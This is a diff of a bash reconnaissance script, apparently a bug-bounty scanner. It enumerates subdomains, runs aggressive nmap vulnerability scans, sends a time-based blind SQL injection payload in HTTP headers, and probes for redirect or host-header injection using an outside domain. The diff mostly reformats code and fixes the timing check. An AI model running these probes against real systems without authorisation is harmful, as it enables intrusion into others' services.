@@ -143,8 +143,7 @@ subdomains(){
 	sort -u -o 1scrap$1.txt 1scrap$1.txt 
 	echo -e "\e[32m************** Scrapping done... **************\033[0m"
 
-	if [[ -f 1scrap$1.txt && ! -s 1scrap$1.txt ]]
-	then
+	if [[ -f 1scrap$1.txt && ! -s 1scrap$1.txt ]]; then
 		echo -e "\e[32m*********** No domains scrapped... ************\033[0m"
 		echo -e "\e[32m***********************************************\033[0m"
 		return
@@ -156,8 +155,7 @@ subdomains(){
 	massdns -q -o S -r ~/tools/massdns/lists/resolvers.txt -w 8massdnssimple$1.txt 1scrap$1.txt
 	echo -e "\e[32m************ DNS Resolving done... ************\033[0m"
 	
-	if [[ -f 2massdns$1.txt && ! -s 2massdns$1.txt ]]
-	then
+	if [[ -f 2massdns$1.txt && ! -s 2massdns$1.txt ]]; then
 		echo -e "\e[32m*********** No domains resolved... ************\033[0m"
 		echo -e "\e[32m***********************************************\033[0m"
 		return
@@ -169,8 +167,7 @@ subdomains(){
 	touch 7nmapvuln$1.txt 9httprobeXORsqli$1.txt
 	
 	# existen http o https accesibles, chequeo sqli y redirects
-	if [[ -f 6httprobe$1.txt && -s 6httprobe$1.txt ]]
-	then
+	if [[ -f 6httprobe$1.txt && -s 6httprobe$1.txt ]]; then
 		echo -e "\e[32m\nDoing Curl to check headers for sqli...\033[0m"
 		echo "******** Checking headers for sqli... *********" >> 9httprobeXORsqli$1.txt
 		checkheadersforsqli 6httprobe$1.txt 9httprobeXORsqli$1.txt
@@ -185,8 +182,7 @@ subdomains(){
 	echo -e "\e[32m************ Alive Checking done... ***********\033[0m"
 	
 	echo -e "\e[32m********** Starting Port scanning... **********\033[0m"
-	if [[ -f 4nmapips$1.txt && -s 4nmapips$1.txt ]]
-	then
+	if [[ -f 4nmapips$1.txt && -s 4nmapips$1.txt ]]; then
 		echo -e "\e[32mDoing Nmap to check top 2000 port vulns/versions...\033[0m"
 		nmap -sS -Pn -T5 --data-length 35 --top-ports 2000 --script "vuln,version" -iL 4nmapips$1.txt > 7nmapvuln$1.txt < /dev/null 2>&1
 	fi
@@ -206,28 +202,24 @@ subdomains(){
 # usage: checkheadersforsqli urllist.txt outputheaderswithsqli.txt
 # output: list of urls and headers with potential sqli
 checkheadersforsqli(){
-	if [[ -f $1 && ! -s $1 ]]
-	then
+	if [[ -f $1 && ! -s $1 ]]; then
 		echo -e "\e[32mUrls file is empty!\033[0m"
 		return
 	fi
-	if [[ -f ~/tools/__diccionarios/headers.txt && ! -s ~/tools/__diccionarios/headers.txt ]]
-	then
+	if [[ -f ~/tools/__diccionarios/headers.txt && ! -s ~/tools/__diccionarios/headers.txt ]]; then
 		echo -e "\e[32mNo headers file found!\033[0m"
 		return
 	fi
 	touch $2
 	cat $1 | while read url; do
 		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
-		if [[ $url =~ $regex ]]
-		then 
+		if [[ $url =~ $regex ]]; then 
 			cat ~/tools/__diccionarios/headers.txt | while read head; do
-				response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "REQUESTTIME %{time_starttransfer}" $url)
-				time=$(echo $response | tail -1)
-				if [$time -gt 6]
-				then
+				response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "%{time_starttransfer}" $url)
+				time=$(echo "$response" | tail -1 | awk -F  "." '{print $1}')
+				if (($time > 6)); then
 					echo "\r\n*** URL: $url - Header: $head\r\n" >> $2
-					echo $response >> $2
+					echo "$response" >> $2
 				fi
 			done
 		fi
@@ -238,16 +230,14 @@ checkheadersforsqli(){
 # usage: checkheadersforredirect urllist.txt outputurlswithredirection.txt
 # output: list of urls and headers with redirection
 checkheadersforredirect(){
-	if [[ -f $1 && ! -s $1 ]]
-	then
+	if [[ -f $1 && ! -s $1 ]]; then
 		echo -e "\e[32mUrls file is empty!\033[0m"
 		return
 	fi
 	touch $2
 	cat $1 | while read url; do
 		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
-		if [[ $url =~ $regex ]]
-		then 
+		if [[ $url =~ $regex ]]; then 
 			response=$(curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -s -L $url)
 			grep -q '<!-- CHECK -->' <<< $response && echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url" >> $2
 			response=$(curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php?$url" -s -L $url)
